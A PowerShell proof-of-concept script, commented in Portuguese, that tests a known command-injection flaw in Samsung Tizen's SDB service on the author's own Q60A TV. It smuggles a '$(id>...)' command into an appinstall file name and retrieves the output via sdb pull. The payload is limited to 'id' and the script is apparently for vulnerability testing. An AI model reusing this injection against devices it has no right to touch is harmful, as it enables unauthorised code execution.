#requires -Version 5.1
<#
  Samsung Q60A / Tizen 6.0: teste pontual SDB NAO-ROOT.
  Inspirado no estudo publico Bishop Fox (2026):
  https://bishopfox.com/blog/samsung-tizen-os-version-through-9-0

  Requer: TV propria, Developer Mode ja ativo e UMA TV ligada por SDB.
  O teste tenta executar APENAS 'id' no contexto do servico SDB e
  redireciona o resultado para um ficheiro de /tmp na TV.
  Nao inicia reverse shell, nao se liga a servidores, nao pede root,
  nao altera firmware, nao modifica rede, nao instala apps.
  Ainda NAO foi testado em Tizen 6.0 / Q60A.

  E um teste de explorabilidade de uma vulnerabilidade conhecida; o
  comando SDB podera devolver 'closed'/erro mesmo quando for executado.
#>
[CmdletBinding()]
param(
  [string]$Sdb = 'C:\tizen-studio\tools\sdb.exe'
)
$ErrorActionPreference='Stop'
if(-not (Test-Path -LiteralPath $Sdb -PathType Leaf)){
  throw "SDB nao encontrado: $Sdb"
}
$devices=@(& $Sdb devices 2>&1 | Where-Object {$_ -match '^\S+\s+device(?:\s|$)'})
if($devices.Count -ne 1){
  throw "Esperava exatamente 1 TV ligada por SDB; encontrei $($devices.Count)."
}
Write-Host 'TV Samsung detetada via SDB (identificadores ocultados).'
Write-Host 'A executar UNICAMENTE o comando de consulta de identidade id, sem root.'
$token=[Guid]::NewGuid().ToString('N').Substring(0,12)
$remote="/tmp/hugo_sdb_probe_$token.txt"
$local=Join-Path $env:TEMP ("hugo_sdb_probe_"+$token+".txt")

# Expressao com $(...) e passada como argumento LITERAL a sdb.exe
# a partir de variavel PowerShell, nao e executada pelo Windows.
# Se vulneravel, /bin/sh na TV executa 'id', gravando APENAS o
# resultado em /tmp. A tentativa de instalar 'test.tpk.tpk' pode falhar.
$payload='0 appinstall tpk test.tpk$(id>{0}).tpk' -f $remote

# O PowerShell 5.1 converte stderr de executaveis nativos em
# NativeCommandError. Com ErrorActionPreference=Stop interrompia o
# script quando SDB respondia "closed", ANTES do teste sdb pull.
# "closed" pode ser normal neste tipo de shell Samsung e, por si
# so, NAO comprova nem exclui execucao do payload.
# Isolar a permissividade apenas nas duas chamadas SDB.
function Invoke-SdbDiagnostic {
  param([string[]]$Arguments)
  $output=@()
  $exitCode=$null
  $savedPreference=$ErrorActionPreference
  try {
    $ErrorActionPreference='Continue'
    try {
      $output=@(& $Sdb @Arguments 2>&1)
      $exitCode=$LASTEXITCODE
    } catch {
      $output+=($_.Exception.Message)
      $exitCode=$LASTEXITCODE
    }
  } finally {
    $ErrorActionPreference=$savedPreference
  }
  return [pscustomobject]@{ Output=$output; ExitCode=$exitCode }
}
function Show-SdbLines {
  param($Result, [int]$Max=8)
  @($Result.Output) | Select-Object -Last $Max | ForEach-Object {
    if($_ -is [System.Management.Automation.ErrorRecord]) {
      Write-Host $_.Exception.Message
    } else {
      Write-Host ([string]$_)
    }
  }
  Write-Host "SDB exit code: $($Result.ExitCode)"
}

Write-Host '1/2 — Tentativa pontual SDB (um comando id, sem persistencia)...'
$shellResult=Invoke-SdbDiagnostic -Arguments @('shell', $payload)
Show-SdbLines -Result $shellResult

Write-Host '2/2 — A tentar recuperar o resultado de /tmp via SDB pull...'
$pullResult=Invoke-SdbDiagnostic -Arguments @('pull', $remote, $local)
if(Test-Path -LiteralPath $local -PathType Leaf){
  $raw=Get-Content -LiteralPath $local -Raw -ErrorAction SilentlyContinue
  $value=if($null -ne $raw){$raw.Trim()}else{''}
  if($value -match '^uid=\d+\(') {
    Write-Host 'PROVA DE EXECUCAO NA TV:'
    Write-Host $value
    Write-Host 'Nota: executar como sdk/owner NAO concede root nem CAP_NET_ADMIN.'
  } else {
    Write-Host 'Ficheiro obtido, mas conteudo inesperado: nao assumir que o teste foi bem-sucedido.'
  }
}else{
  Write-Host 'Resultado INCONCLUSIVO: ficheiro nao recuperado por SDB pull.'
  Write-Host 'O teste pode estar corrigido, ter sido bloqueado, ou o pull pode nao aceder a /tmp.'
  Write-Host 'Mensagem resumida do pull:'
  Show-SdbLines -Result $pullResult -Max 7
}
Write-Host 'Fim. Nao foram pedidas passwords nem foram alteradas rotas, VPN ou firmware.'
